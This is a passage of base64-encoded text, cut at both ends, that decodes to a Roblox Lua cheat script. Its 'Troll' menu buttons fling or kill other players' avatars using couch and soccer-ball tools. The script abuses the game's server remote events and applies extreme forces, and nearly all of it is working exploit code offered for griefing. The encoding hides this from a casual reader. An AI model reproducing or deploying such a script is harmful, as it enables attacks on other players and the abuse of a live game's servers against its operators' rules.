Fja0hvbGVUYXJnZXQiCkJsYWNrSG9sZS5QYXJlbnQgPSBXb3Jrc3BhY2UKCmxvY2FsIGJhc2VBdHRhY2htZW50ID0gSW5zdGFuY2UubmV3KCJBdHRhY2htZW50IikKYmFzZUF0dGFjaG1lbnQuTmFtZSA9ICJMeW54X0JsYWNrSG9sZUF0dGFjaG1lbnQiCmJhc2VBdHRhY2htZW50LlBhcmVudCA9IEJsYWNrSG9sZQoKUnVuU2VydmljZS5IZWFydGJlYXQ6Q29ubmVjdChmdW5jdGlvbigpCglCbGFja0hvbGUuQ0ZyYW1lID0gSFJQLkNGcmFtZQplbmQpCgpsb2NhbCBDb250cm9sbGVkRG9vcnMgPSB7fQoKbG9jYWwgZnVuY3Rpb24gU2V0dXBQYXJ0KHBhcnQpCglpZiBub3QgcGFydDpJc0EoIkJhc2VQYXJ0Iikgb3IgcGFydC5BbmNob3JlZCBvciBub3Qgc3RyaW5nLmZpbmQocGFydC5OYW1lLCAiRG9vciIpIHRoZW4gcmV0dXJuIGVuZAoJaWYgcGFydDpGaW5kRmlyc3RDaGlsZCgiTHlueF9BdHRhY2hlZCIpIHRoZW4gcmV0dXJuIGVuZAoKCXBhcnQuQ2FuQ29sbGlkZSA9IGZhbHNlCgoJZm9yIF8sIG9iaiBpbiBpcGFpcnMocGFydDpHZXRDaGlsZHJlbigpKSBkbwoJCWlmIG9iajpJc0EoIkFsaWduUG9zaXRpb24iKSBvciBvYmo6SXNBKCJUb3JxdWUiKSBvciBvYmo6SXNBKCJBdHRhY2htZW50IikgdGhlbgoJCQlvYmo6RGVzdHJveSgpCgkJZW5kCgllbmQKCglsb2NhbCBtYXJrZXIgPSBJbnN0YW5jZS5uZXcoIkJvb2xWYWx1ZSIsIHBhcnQpCgltYXJrZXIuTmFtZSA9ICJMeW54X0F0dGFjaGVkIgoKCWxvY2FsIGExID0gSW5zdGFuY2UubmV3KCJBdHRhY2htZW50IiwgcGFydCkKCglsb2NhbCBhbGlnbiA9IEluc3RhbmNlLm5ldygiQWxpZ25Qb3NpdGlvbiIsIHBhcnQpCglhbGlnbi5BdHRhY2htZW50MCA9IGExCglhbGlnbi5BdHRhY2htZW50MSA9IGJhc2VBdHRhY2htZW50CglhbGlnbi5NYXhGb3JjZSA9IDFlMjAKCWFsaWduLk1heFZlbG9jaXR5ID0gbWF0aC5odWdlCglhbGlnbi5SZXNwb25zaXZlbmVzcyA9IDk5OTk5CgoJbG9jYWwgdG9ycXVlID0gSW5zdGFuY2UubmV3KCJUb3JxdWUiLCBwYXJ0KQoJdG9ycXVlLkF0dGFjaG1lbnQwID0gYTEKCXRvcnF1ZS5SZWxhdGl2ZVRvID0gRW51bS5BY3R1YXRvclJlbGF0aXZlVG8uV29ybGQKCXRvcnF1ZS5Ub3JxdWUgPSBWZWN0b3IzLm5ldygKCQltYXRoLnJhbmRvbSgtMTBlNSwgMTBlNSkgKiAxMDAwMCwKCQltYXRoLnJhbmRvbSgtMTBlNSwgMTBlNSkgKiAxMDAwMCwKCQltYXRoLnJhbmRvbSgtMTBlNSwgMTBlNSkgKiAxMDAwMAoJKQoKCXRhYmxlLmluc2VydChDb250cm9sbGVkRG9vcnMsIHtQYXJ0ID0gcGFydCwgQWxpZ24gPSBhbGlnbn0pCmVuZAoKLS0gRGV0ZWN0IGFuZCBwcmVwYXJlIGV4aXN0aW5nIGRvb3JzCmZvciBfLCBvYmogaW4gaXBhaXJzKFdvcmtzcGFjZTpHZXREZXNjZW5kYW50cygpKSBkbwoJaWYgb2JqOklzQSgiQmFzZVBhcnQiKSBhbmQgc3RyaW5nLmZpbmQob2JqLk5hbWUsICJEb29yIikgdGhlbgoJCVNldHVwUGFydChvYmopCgllbmQKZW5kCgotLSBOZXcgZG9vcnMgaW4gdGhlIGZ1dHVyZQpXb3Jrc3BhY2UuRGVzY2VuZGFudEFkZGVkOkNvbm5lY3QoZnVuY3Rpb24ob2JqKQoJaWYgb2JqOklzQSgiQmFzZVBhcnQiKSBhbmQgc3RyaW5nLmZpbmQob2JqLk5hbWUsICJEb29yIikgdGhlbgoJCVNldHVwUGFydChvYmopCgllbmQKZW5kKQoKLS0gRmxpbmcgcGxheWVyIHdpdGggdGltZW91dCBhbmQgcmV0dXJuCmxvY2FsIGZ1bmN0aW9uIEZsaW5nUGxheWVyKHBsYXllcikKCWxvY2FsIGNoYXIgPSBwbGF5ZXIuQ2hhcmFjdGVyCglpZiBub3QgY2hhciB0aGVuIHJldHVybiBlbmQKCWxvY2FsIHRhcmdldEhSUCA9IGNoYXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiKQoJaWYgbm90IHRhcmdldEhSUCB0aGVuIHJldHVybiBlbmQKCglsb2NhbCB0YXJnZXRBdHRhY2htZW50ID0gdGFyZ2V0SFJQOkZpbmRGaXJzdENoaWxkKCJMeW54X1RhcmdldEF0dGFjaG1lbnQiKQoJaWYgbm90IHRhcmdldEF0dGFjaG1lbnQgdGhlbgoJCXRhcmdldEF0dGFjaG1lbnQgPSBJbnN0YW5jZS5uZXcoIkF0dGFjaG1lbnQiLCB0YXJnZXRIUlApCgkJdGFyZ2V0QXR0YWNobWVudC5OYW1lID0gIkx5bnhfVGFyZ2V0QXR0YWNobWVudCIKCWVuZAoKCWZvciBfLCBkYXRhIGluIGlwYWlycyhDb250cm9sbGVkRG9vcnMpIGRvCgkJaWYgZGF0YS5BbGlnbiB0aGVuCgkJCWRhdGEuQWxpZ24uQXR0YWNobWVudDEgPSB0YXJnZXRBdHRhY2htZW50CgkJZW5kCgllbmQKCglsb2NhbCBzdGFydCA9IHRpY2soKQoJbG9jYWwgZmxpbmdEZXRlY3RlZCA9IGZhbHNlCgoJd2hpbGUgdGljaygpIC0gc3RhcnQgPCA1IGRvCgkJaWYgdGFyZ2V0SFJQLlZlbG9jaXR5Lk1hZ25pdHVkZSA+PSAyMCB0aGVuCgkJCWZsaW5nRGV0ZWN0ZWQgPSB0cnVlCgkJCWJyZWFrCgkJZW5kCgkJUnVuU2VydmljZS5IZWFydGJlYXQ6V2FpdCgpCgllbmQKCgktLSBBbHdheXMgcmV0dXJuIHRoZSBkb29ycwoJZm9yIF8sIGRhdGEgaW4gaXBhaXJzKENvbnRyb2xsZWREb29ycykgZG8KCQlpZiBkYXRhLkFsaWduIHRoZW4KCQkJZGF0YS5BbGlnbi5BdHRhY2htZW50MSA9IGJhc2VBdHRhY2htZW50CgkJZW5kCgllbmQKZW5kCgotLSBDbGljayAod29ya3Mgb24gbW9iaWxlKQpVc2VySW5wdXRTZXJ2aWNlLlRvdWNoVGFwOkNvbm5lY3QoZnVuY3Rpb24odG91Y2hQb3NpdGlvbnMsIHByb2Nlc3NlZCkKCWlmIHByb2Nlc3NlZCB0aGVuIHJldHVybiBlbmQKCWxvY2FsIHBvcyA9IHRvdWNoUG9zaXRpb25zWzFdCglsb2NhbCBjYW1lcmEgPSBXb3Jrc3BhY2UuQ3VycmVudENhbWVyYQoJbG9jYWwgdW5pdFJheSA9IGNhbWVyYTpTY3JlZW5Qb2ludFRvUmF5KHBvcy5YLCBwb3MuWSkKCWxvY2FsIHJheWNhc3QgPSBXb3Jrc3BhY2U6UmF5Y2FzdCh1bml0UmF5Lk9yaWdpbiwgdW5pdFJheS5EaXJlY3Rpb24gKiAxMDAwKQoKCWlmIHJheWNhc3QgYW5kIHJheWNhc3QuSW5zdGFuY2UgdGhlbgoJCWxvY2FsIGhpdCA9IHJheWNhc3QuSW5zdGFuY2UKCQlsb2NhbCBwbGF5ZXIgPSBQbGF5ZXJzOkdldFBsYXllckZyb21DaGFyYWN0ZXIoaGl0OkZpbmRGaXJzdEFuY2VzdG9yT2ZDbGFzcygiTW9kZWwiKSkKCQlpZiBwbGF5ZXIgYW5kIHBsYXllciB+PSBMb2NhbFBsYXllciB0aGVuCgkJCUZsaW5nUGxheWVyKHBsYXllcikKCQllbmQKCWVuZAplbmQpCiAgZW5kCn0pCgoKVHJvbGw6QWRkQnV0dG9uKHsKICAgIE5hbWUgPSAiRmxpbmcgdXNpbmcgQ291Y2ggKFRvb2wpIiwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24oKQoKbG9jYWwgcGxheWVycyA9IGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpCmxvY2FsIHJlcGxpY2F0ZWRTdG9yYWdlID0gZ2FtZTpHZXRTZXJ2aWNlKCJSZXBsaWNhdGVkU3RvcmFnZSIpCmxvY2FsIHVzZXJJbnB1dCA9IGdhbWU6R2V0U2VydmljZSgiVXNlcklucHV0U2VydmljZSIpCmxvY2FsIGxvY2FsUGxheWVyID0gcGxheWVycy5Mb2NhbFBsYXllcgpsb2NhbCBjYW1lcmEgPSB3b3Jrc3BhY2UuQ3VycmVudENhbWVyYQoKbG9jYWwgY2FuQ2xpY2sgPSB0cnVlCmxvY2FsIHRvb2xFcXVpcHBlZCA9IGZhbHNlCmxvY2FsIFRPT0xfTkFNRSA9ICJGbGluZyBDb3VjaCIKCmxvY2FsIGJhY2twYWNrID0gbG9jYWxQbGF5ZXI6V2FpdEZvckNoaWxkKCJCYWNrcGFjayIpCgppZiBub3QgYmFja3BhY2s6RmluZEZpcnN0Q2hpbGQoVE9PTF9OQU1FKSBhbmQgbm90IChsb2NhbFBsYXllci5DaGFyYWN0ZXIgYW5kIGxvY2FsUGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZChUT09MX05BTUUpKSB0aGVuCglsb2NhbCB0b29sID0gSW5zdGFuY2UubmV3KCJUb29sIikKCXRvb2wuTmFtZSA9IFRPT0xfTkFNRQoJdG9vbC5SZXF1aXJlc0hhbmRsZSA9IGZhbHNlCgl0b29sLkNhbkJlRHJvcHBlZCA9IGZhbHNlCgoJdG9vbC5FcXVpcHBlZDpDb25uZWN0KGZ1bmN0aW9uKCkKCQl0b29sRXF1aXBwZWQgPSB0cnVlCgllbmQpCgoJdG9vbC5VbmVxdWlwcGVkOkNvbm5lY3QoZnVuY3Rpb24oKQoJCXRvb2xFcXVpcHBlZCA9IGZhbHNlCgllbmQpCgoJdG9vbC5QYXJlbnQgPSBiYWNrcGFjawplbmQKCmxvY2FsIGZ1bmN0aW9uIGZsaW5nV2l0aENvdWNoKHRhcmdldCkKCWlmIG5vdCB0b29sRXF1aXBwZWQgdGhlbiByZXR1cm4gZW5kCglpZiBub3QgdGFyZ2V0IG9yIG5vdCB0YXJnZXQuQ2hhcmFjdGVyIG9yIHRhcmdldCA9PSBsb2NhbFBsYXllciB0aGVuIHJldHVybiBlbmQKCglsb2NhbCBpc0ZsaW5naW5nID0gdHJ1ZQoJbG9jYWwgcm9vdFBhcnQgPSBsb2NhbFBsYXllci5DaGFyYWN0ZXIgYW5kIGxvY2FsUGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpCglsb2NhbCB0YXJnZXRSb290UGFydCA9IHRhcmdldC5DaGFyYWN0ZXIgYW5kIHRhcmdldC5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiKQoJaWYgbm90IHJvb3RQYXJ0IG9yIG5vdCB0YXJnZXRSb290UGFydCB0aGVuIHJldHVybiBlbmQKCglsb2NhbCBjaGFyYWN0ZXIgPSBsb2NhbFBsYXllci5DaGFyYWN0ZXIKCWxvY2FsIGh1bWFub2lkID0gY2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkT2ZDbGFzcygiSHVtYW5vaWQiKQoJbG9jYWwgb3JpZ2luYWxDRnJhbWUgPSByb290UGFydC5DRnJhbWUKCglyZXBsaWNhdGVkU3RvcmFnZTpXYWl0Rm9yQ2hpbGQoIlJFIik6V2FpdEZvckNoaWxkKCIxQ2xlYTFyVG9vbDFzIik6RmlyZVNlcnZlcigiQ2xlYXJBbGxUb29scyIpCgl0YXNrLndhaXQoMC4yKQoKCXJlcGxpY2F0ZWRTdG9yYWdlLlJFOkZpbmRGaXJzdENoaWxkKCIxVG9vMWwiKTpJbnZva2VTZXJ2ZXIoIlBpY2tpbmdUb29scyIsICJDb3VjaCIpCgl0YXNrLndhaXQoMC4zKQoKCWxvY2FsIGNvdWNoID0gbG9jYWxQbGF5ZXIuQmFja3BhY2s6RmluZEZpcnN0Q2hpbGQoIkNvdWNoIikKCWlmIGNvdWNoIHRoZW4KCQljb3VjaC5QYXJlbnQgPSBjaGFyYWN0ZXIKCWVuZAoJdGFzay53YWl0KDAuMSkKCglnYW1lOkdldFNlcnZpY2UoIlZpcnR1YWxJbnB1dE1hbmFnZXIiKTpTZW5kS2V5RXZlbnQodHJ1ZSwgRW51bS5LZXlDb2RlLkYsIGZhbHNlLCBnYW1lKQoJdGFzay53YWl0KDAuMjUpCgoJd29ya3NwYWNlLkZhbGxlblBhcnRzRGVzdHJveUhlaWdodCA9IDAvMAoKCWxvY2FsIGZvcmNlID0gSW5zdGFuY2UubmV3KCJCb2R5VmVsb2NpdHkiKQoJZm9yY2UuTmFtZSA9ICJGbGluZ0ZvcmNlIgoJZm9yY2UuVmVsb2NpdHkgPSBWZWN0b3IzLm5ldyg5ZTgsIDllOCwgOWU4KQoJZm9yY2UuTWF4Rm9yY2UgPSBWZWN0b3IzLm5ldyhtYXRoLmh1Z2UsIG1hdGguaHVnZSwgbWF0aC5odWdlKQoJZm9yY2UuUGFyZW50ID0gcm9vdFBhcnQKCglodW1hbm9pZDpTZXRTdGF0ZUVuYWJsZWQoRW51bS5IdW1hbm9pZFN0YXRlVHlwZS5TZWF0ZWQsIGZhbHNlKQoJaHVtYW5vaWQuUGxhdGZvcm1TdGFuZCA9IGZhbHNlCgljYW1lcmEuQ2FtZXJhU3ViamVjdCA9IHRhcmdldC5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkhlYWQiKSBvciB0YXJnZXRSb290UGFydCBvciBodW1hbm9pZAoKCXRhc2suc3Bhd24oZnVuY3Rpb24oKQoJCWxvY2FsIGFuZ2xlID0gMAoJCWxvY2FsIHBhcnRzID0ge3Jvb3RQYXJ0fQoJCXdoaWxlIGlzRmxpbmdpbmcgYW5kIHRhcmdldCBhbmQgdGFyZ2V0LkNoYXJhY3RlciBhbmQgdGFyZ2V0LkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZE9mQ2xhc3MoIkh1bWFub2lkIikgZG8KCQkJbG9jYWwgdGFyZ2V0SHVtYW5vaWQgPSB0YXJnZXQuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkT2ZDbGFzcygiSHVtYW5vaWQiKQoJCQlpZiB0YXJnZXRIdW1hbm9pZC5TaXQgdGhlbiBicmVhayBlbmQKCQkJYW5nbGUgKz0gNTAKCgkJCWZvciBfLCBwYXJ0IGluIGlwYWlycyhwYXJ0cykgZG8KCQkJCWxvY2FsIGhycCA9IHRhcmdldC5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydAoJCQkJbG9jYWwgcG9zID0gaHJwLlBvc2l0aW9uICsgaHJwLlZlbG9jaXR5IC8gMS41CgkJCQlyb290UGFydC5DRnJhbWUgPSBDRnJhbWUubmV3KHBvcykgKiBDRnJhbWUuQW5nbGVzKG1hdGgucmFkKGFuZ2xlKSwgMCwgMCkKCQkJZW5kCgoJCQlyb290UGFydC5WZWxvY2l0eSA9IFZlY3RvcjMubmV3KDllOCwgOWU4LCA5ZTgpCgkJCXJvb3RQYXJ0LlJvdFZlbG9jaXR5ID0gVmVjdG9yMy5uZXcoOWU4LCA5ZTgsIDllOCkKCQkJdGFzay53YWl0KCkKCQllbmQKCgkJaXNGbGluZ2luZyA9IGZhbHNlCgkJZm9yY2U6RGVzdHJveSgpCgkJaHVtYW5vaWQ6U2V0U3RhdGVFbmFibGVkKEVudW0uSHVtYW5vaWRTdGF0ZVR5cGUuU2VhdGVkLCB0cnVlKQoJCWh1bWFub2lkLlBsYXRmb3JtU3RhbmQgPSBmYWxzZQoJCXJvb3RQYXJ0LkNGcmFtZSA9IG9yaWdpbmFsQ0ZyYW1lCgkJY2FtZXJhLkNhbWVyYVN1YmplY3QgPSBodW1hbm9pZAoKCQlmb3IgXywgcCBpbiBwYWlycyhjaGFyYWN0ZXI6R2V0RGVzY2VuZGFudHMoKSkgZG8KCQkJaWYgcDpJc0EoIkJhc2VQYXJ0IikgdGhlbgoJCQkJcC5WZWxvY2l0eSA9IFZlY3RvcjMuemVybwoJCQkJcC5Sb3RWZWxvY2l0eSA9IFZlY3RvcjMuemVybwoJCQllbmQKCQllbmQKCgkJaHVtYW5vaWQ6VW5lcXVpcFRvb2xzKCkKCQlyZXBsaWNhdGVkU3RvcmFnZS5SRTpGaW5kRmlyc3RDaGlsZCgiMVRvbzFsIik6SW52b2tlU2VydmVyKCJQaWNraW5nVG9vbHMiLCAiQ291Y2giKQoJZW5kKQoKCXdoaWxlIGlzRmxpbmdpbmcgZG8KCQl0YXNrLndhaXQoKQoJZW5kCmVuZAoKdXNlcklucHV0LlRvdWNoVGFwOkNvbm5lY3QoZnVuY3Rpb24odG91Y2hlcywgcHJvY2Vzc2VkKQoJaWYgcHJvY2Vzc2VkIG9yIG5vdCBjYW5DbGljayBvciBub3QgdG9vbEVxdWlwcGVkIHRoZW4gcmV0dXJuIGVuZAoKCWxvY2FsIHBvcyA9IHRvdWNoZXNbMV0KCWxvY2FsIHJheSA9IGNhbWVyYTpTY3JlZW5Qb2ludFRvUmF5KHBvcy5YLCBwb3MuWSkKCWxvY2FsIGhpdFJlc3VsdCA9IHdvcmtzcGFjZTpSYXljYXN0KHJheS5PcmlnaW4sIHJheS5EaXJlY3Rpb24gKiAxMDAwKQoKCWlmIGhpdFJlc3VsdCBhbmQgaGl0UmVzdWx0Lkluc3RhbmNlIHRoZW4KCQlsb2NhbCB0YXJnZXQgPSBwbGF5ZXJzOkdldFBsYXllckZyb21DaGFyYWN0ZXIoaGl0UmVzdWx0Lkluc3RhbmNlOkZpbmRGaXJzdEFuY2VzdG9yT2ZDbGFzcygiTW9kZWwiKSkKCQlpZiB0YXJnZXQgYW5kIHRhcmdldCB+PSBsb2NhbFBsYXllciB0aGVuCgkJCWNhbkNsaWNrID0gZmFsc2UKCQkJZmxpbmdXaXRoQ291Y2godGFyZ2V0KQoJCQl0YXNrLmRlbGF5KDIsIGZ1bmN0aW9uKCkKCQkJCWNhbkNsaWNrID0gdHJ1ZQoJCQllbmQpCgkJZW5kCgllbmQKZW5kKQplbmQKfSkKClRyb2xsOkFkZEJ1dHRvbih7CiAgICBOYW1lID0gIkZsaW5nIHVzaW5nIEJhbGwgKFRvb2wpIiwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24oKQpsb2NhbCBwbGF5ZXJzID0gZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikKbG9jYWwgcmVwbGljYXRlZFN0b3JhZ2UgPSBnYW1lOkdldFNlcnZpY2UoIlJlcGxpY2F0ZWRTdG9yYWdlIikKbG9jYWwgd29ybGQgPSBnYW1lOkdldFNlcnZpY2UoIldvcmtzcGFjZSIpCmxvY2FsIHVzZXJJbnB1dCA9IGdhbWU6R2V0U2VydmljZSgiVXNlcklucHV0U2VydmljZSIpCmxvY2FsIGNhbWVyYSA9IHdvcmxkLkN1cnJlbnRDYW1lcmEKbG9jYWwgbG9jYWxQbGF5ZXIgPSBwbGF5ZXJzLkxvY2FsUGxheWVyCgpsb2NhbCBUT09MX05BTUUgPSAiRmxpbmcgQmFsbCIKbG9jYWwgdG9vbEVxdWlwcGVkID0gZmFsc2UKCmxvY2FsIGJhY2twYWNrID0gbG9jYWxQbGF5ZXI6V2FpdEZvckNoaWxkKCJCYWNrcGFjayIpCmlmIG5vdCBiYWNrcGFjazpGaW5kRmlyc3RDaGlsZChUT09MX05BTUUpIHRoZW4KCWxvY2FsIHRvb2wgPSBJbnN0YW5jZS5uZXcoIlRvb2wiKQoJdG9vbC5OYW1lID0gVE9PTF9OQU1FCgl0b29sLlJlcXVpcmVzSGFuZGxlID0gZmFsc2UKCXRvb2wuQ2FuQmVEcm9wcGVkID0gZmFsc2UKCgl0b29sLkVxdWlwcGVkOkNvbm5lY3QoZnVuY3Rpb24oKQoJCXRvb2xFcXVpcHBlZCA9IHRydWUKCWVuZCkKCgl0b29sLlVuZXF1aXBwZWQ6Q29ubmVjdChmdW5jdGlvbigpCgkJdG9vbEVxdWlwcGVkID0gZmFsc2UKCWVuZCkKCgl0b29sLlBhcmVudCA9IGJhY2twYWNrCmVuZAoKLS0gRmxpbmdCYWxsIGZ1bmN0aW9uIChiYWxsKQpsb2NhbCBmdW5jdGlvbiBGbGluZ0JhbGwodGFyZ2V0KQogICAgCgogICAgbG9jYWwgcGxheWVycyA9IGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpCiAgICBsb2NhbCBwbGF5ZXIgPSBwbGF5ZXJzLkxvY2FsUGxheWVyCiAgICBsb2NhbCBjaGFyYWN0ZXIgPSBwbGF5ZXIuQ2hhcmFjdGVyIG9yIHBsYXllci5DaGFyYWN0ZXJBZGRlZDpXYWl0KCkKICAgIGxvY2FsIGh1bWFub2lkID0gY2hhcmFjdGVyOldhaXRGb3JDaGlsZCgiSHVtYW5vaWQiKQogICAgbG9jYWwgaHJwID0gY2hhcmFjdGVyOldhaXRGb3JDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpCiAgICBsb2NhbCBiYWNrcGFjayA9IHBsYXllcjpXYWl0Rm9yQ2hpbGQoIkJhY2twYWNrIikKICAgIGxvY2FsIFNlcnZlckJhbGxzID0gd29ya3NwYWNlLldvcmtzcGFjZUNvbTpXYWl0Rm9yQ2hpbGQoIjAwMV9Tb2NjZXJCYWxscyIpCgogICAgbG9jYWwgZnVuY3Rpb24gR2V0QmFsbCgpCiAgICAgICAgaWYgbm90IGJhY2twYWNrOkZpbmRGaXJzdENoaWxkKCJTb2NjZXJCYWxsIikgYW5kIG5vdCBjaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIlNvY2NlckJhbGwiKSB0aGVuCiAgICAgICAgICAgIGdhbWU6R2V0U2VydmljZSgiUmVwbGljYXRlZFN0b3JhZ2UiKS5SRTpGaW5kRmlyc3RDaGlsZCgiMVRvbzFsIik6SW52b2tlU2VydmVyKCJQaWNraW5nVG9vbHMiLCAiU29jY2VyQmFsbCIpCiAgICAgICAgZW5kCgogICAgICAgIHJlcGVhdCB0YXNrLndhaXQoKSB1bnRpbCBiYWNrcGFjazpGaW5kRmlyc3RDaGlsZCgiU29jY2VyQmFsbCIpIG9yIGNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiU29jY2VyQmFsbCIpCgogICAgICAgIGxvY2FsIGJhbGxUb29sID0gYmFja3BhY2s6RmluZEZpcnN0Q2hpbGQoIlNvY2NlckJhbGwiKQogICAgICAgIGlmIGJhbGxUb29sIHRoZW4KICAgICAgICAgICAgYmFsbFRvb2wuUGFyZW50ID0gY2hhcmFjdGVyCiAgICAgICAgZW5kCgogICAgICAgIHJlcGVhdCB0YXNrLndhaXQoKSB1bnRpbCBTZXJ2ZXJCYWxsczpGaW5kRmlyc3RDaGlsZCgiU29jY2VyIiAuLiBwbGF5ZXIuTmFtZSkKCiAgICAgICAgcmV0dXJuIFNlcnZlckJhbGxzOkZpbmRGaXJzdENoaWxkKCJTb2NjZXIiIC4uIHBsYXllci5OYW1lKQogICAgZW5kCgogICAgbG9jYWwgQmFsbCA9IFNlcnZlckJhbGxzOkZpbmRGaXJzdENoaWxkKCJTb2NjZXIiIC4uIHBsYXllci5OYW1lKSBvciBHZXRCYWxsKCkKICAgIEJhbGwuQ2FuQ29sbGlkZSA9IGZhbHNlCiAgICBCYWxsLk1hc3NsZXNzID0gdHJ1ZQogICAgQmFsbC5DdXN0b21QaHlzaWNhbFByb3BlcnRpZXMgPSBQaHlzaWNhbFByb3BlcnRpZXMubmV3KDAuMDAwMSwgMCwgMCkKCiAgICBpZiB0YXJnZXQgfj0gcGxheWVyIHRoZW4KICAgICAgICBsb2NhbCB0Y2hhciA9IHRhcmdldC5DaGFyYWN0ZXIKICAgICAgICBpZiB0Y2hhciBhbmQgdGNoYXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiKSBhbmQgdGNoYXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkIikgdGhlbgogICAgICAgICAgICBsb2NhbCB0cm9vdCA9IHRjaGFyLkh1bWFub2lkUm9vdFBhcnQKICAgICAgICAgICAgbG9jYWwgdGh1bSA9IHRjaGFyLkh1bWFub2lkCgogICAgICAgICAgICBpZiBCYWxsOkZpbmRGaXJzdENoaWxkV2hpY2hJc0EoIkJvZHlWZWxvY2l0eSIpIHRoZW4KICAgICAgICAgICAgICAgIEJhbGw6RmluZEZpcnN0Q2hpbGRXaGljaElzQSgiQm9keVZlbG9jaXR5Iik6RGVzdHJveSgpCiAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgbG9jYWwgYnYgPSBJbnN0YW5jZS5uZXcoIkJvZHlWZWxvY2l0eSIpCiAgICAgICAgICAgIGJ2Lk5hbWUgPSAiRmxpbmdQb3dlciIKICAgICAgICAgICAgYnYuVmVsb2NpdHkgPSBWZWN0b3IzLm5ldyg5ZTgsIDllOCwgOWU4KQogICAgICAgICAgICBidi5NYXhGb3JjZSA9IFZlY3RvcjMubmV3KG1hdGguaHVnZSwgbWF0aC5odWdlLCBtYXRoLmh1Z2UpCiAgICAgICAgICAgIGJ2LlAgPSA5ZTkwMAogICAgICAgICAgICBidi5QYXJlbnQgPSBCYWxsCgogICAgICAgICAgICB3b3Jrc3BhY2UuQ3VycmVudENhbWVyYS5DYW1lcmFTdWJqZWN0ID0gdGh1bQoKICAgICAgICAgICAgcmVwZWF0CiAgICAgICAgICAgICAgICBpZiB0cm9vdC5WZWxvY2l0eS5NYWduaXR1ZGUgPiAwIHRoZW4KICAgICAgICAgICAgICAgICAgICBsb2NhbCBwb3MgPSB0cm9vdC5Qb3NpdGlvbiArICh0cm9vdC5WZWxvY2l0eSAvIDEuNSkKICAgICAgICAgICAgICAgICAgICBCYWxsLkNGcmFtZSA9IENGcmFtZS5uZXcocG9zKQogICAgICAgICAgICAgICAgICAgIEJhbGwuT3JpZW50YXRpb24gKz0gVmVjdG9yMy5uZXcoNDUsIDYwLCAzMCkKICAgICAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgICAgICBmb3IgaSwgdiBpbiBwYWlycyh0Y2hhcjpHZXRDaGlsZHJlbigpKSBkbwogICAgICAgICAgICAgICAgICAgICAgICBpZiB2OklzQSgiQmFzZVBhcnQiKSBhbmQgdi5DYW5Db2xsaWRlIGFuZCBub3Qgdi5BbmNob3JlZCB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBCYWxsLkNGcmFtZSA9IHYuQ0ZyYW1lCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoMS82MDAwKQogICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgdGFzay53YWl0KDEvNjAwMCkKICAgICAgICAgICAgdW50aWwgdHJvb3QuVmVsb2NpdHkuTWFnbml0dWRlID4gMTAwMCBvciB0aHVtLkhlYWx0aCA8PSAwIG9yIG5vdCB0Y2hhcjpJc0Rlc2NlbmRhbnRPZih3b3Jrc3BhY2UpIG9yIHRhcmdldC5QYXJlbnQgfj0gcGxheWVycwoKICAgICAgICAgICAgd29ya3NwYWNlLkN1cnJlbnRDYW1lcmEuQ2FtZXJhU3ViamVjdCA9IGh1bWFub2lkCiAgICAgICAgZW5kCiAgICBlbmQKZW5kCgotLSBUb3VjaCBzY3JlZW4gdG8gYXBwbHkgYmFsbAp1c2VySW5wdXQuVG91Y2hUYXA6Q29ubmVjdChmdW5jdGlvbih0b3VjaGVzLCBwcm9jZXNzZWQpCglpZiBub3QgdG9vbEVxdWlwcGVkIG9yIHByb2Nlc3NlZCB0aGVuIHJldHVybiBlbmQKCWxvY2FsIHBvcyA9IHRvdWNoZXNbMV0KCWxvY2FsIHJheSA9IGNhbWVyYTpTY3JlZW5Qb2ludFRvUmF5KHBvcy5YLCBwb3MuWSkKCWxvY2FsIGhpdCA9IHdvcmxkOlJheWNhc3QocmF5Lk9yaWdpbiwgcmF5LkRpcmVjdGlvbiAqIDEwMDApCglpZiBoaXQgYW5kIGhpdC5JbnN0YW5jZSB0aGVuCgkJbG9jYWwgbW9kZWwgPSBoaXQuSW5zdGFuY2U6RmluZEZpcnN0QW5jZXN0b3JPZkNsYXNzKCJNb2RlbCIpCgkJbG9jYWwgcGxheWVyID0gcGxheWVyczpHZXRQbGF5ZXJGcm9tQ2hhcmFjdGVyKG1vZGVsKQoJCWlmIHBsYXllciBhbmQgcGxheWVyIH49IGxvY2FsUGxheWVyIHRoZW4KCQkJRmxpbmdCYWxsKHBsYXllcikKCQllbmQKCWVuZAplbmQpCgplbmQKfSkKClRyb2xsOkFkZEJ1dHRvbih7CiAgICBOYW1lID0gIktpbGwgdXNpbmcgQ291Y2ggKFRvb2wpIiwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24oKQoKbG9jYWwgcGxheWVycyA9IGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpCmxvY2FsIHJlcGxpY2F0ZWRTdG9yYWdlID0gZ2FtZTpHZXRTZXJ2aWNlKCJSZXBsaWNhdGVkU3RvcmFnZSIpCmxvY2FsIHJ1blNlcnZpY2UgPSBnYW1lOkdldFNlcnZpY2UoIlJ1blNlcnZpY2UiKQpsb2NhbCB3b3JsZCA9IGdhbWU6R2V0U2VydmljZSg